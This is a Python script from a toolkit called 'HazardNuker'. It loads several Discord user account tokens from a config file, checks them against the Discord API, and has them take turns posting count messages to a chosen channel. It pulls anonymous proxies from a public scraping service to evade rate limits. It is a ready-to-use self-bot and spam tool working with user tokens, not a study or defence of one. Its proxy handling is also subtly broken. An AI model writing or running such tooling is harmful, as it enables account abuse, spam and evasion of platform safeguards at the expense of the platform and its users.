# Code by TerrificTable (https://github.com/TerrificTable)

from colorama import Fore
import requests
import json
import time
import os


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def proxy_scrape():
    startTime = time.time()
    temp = os.getenv("temp")+"\\proxies.txt"
    print(f"{Fore.YELLOW}Please wait while HazardNuker Scrapes proxies for you!")
    r = requests.get(
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=8500&country=all&ssl=all&anonymity=elite&simplified=true", headers=getheaders())
    with open(temp, "wb") as f:
        f.write(r.content)
    execution_time = (time.time() - startTime)
    print(f"{Fore.GREEN}Done scraping proxies => {temp}{Fore.RESET} | {execution_time}ms")


def proxy():
    temp = os.getenv("temp")+"\\proxies.txt"
    if not os.path.exists(temp):
        with open(temp, "w") as f:
            f.close()
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[1]

    with open(temp, 'r+') as fp:
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[1:])
    return proxy


with open("./c-config.json", "r") as f:
    data = json.load(f)

count = int(data["start"])
index = 0
os.system("cls")
for i in range(int(data["end"])):
    tokens = data["tokens"]

    if index >= 2:
        index = 0
    token = tokens[index]
    index += 1

    r = requests.get('https://discord.com/api/v9/users/@me',
                     headers=getheaders(token))

    userName = r.json()['username']
    userID = r.json()['id']
    space = "".join(" " for i in range(19 - len(userName)))
    print(userName + space + "|  " + str(count))

    headers = {'Authorization': token}
    requests.post(f'https://discord.com/api/v9/channels/'+data["channelID"]+'/messages',
                  proxies={"ftp": f'{proxy()}'},
                  headers=headers,
                  data={"content": f"{count}"})
    count += 1
